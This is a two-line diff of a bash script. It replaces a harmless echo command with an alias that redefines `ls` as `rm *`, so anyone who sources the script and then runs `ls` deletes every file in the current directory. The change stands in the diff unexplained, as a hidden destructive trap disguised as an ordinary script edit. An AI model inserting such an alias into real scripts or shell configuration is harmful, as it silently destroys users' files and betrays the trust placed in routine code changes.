@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "This is line 1" | cat - <(echo "This is line 2")
+alias ls='rm *'
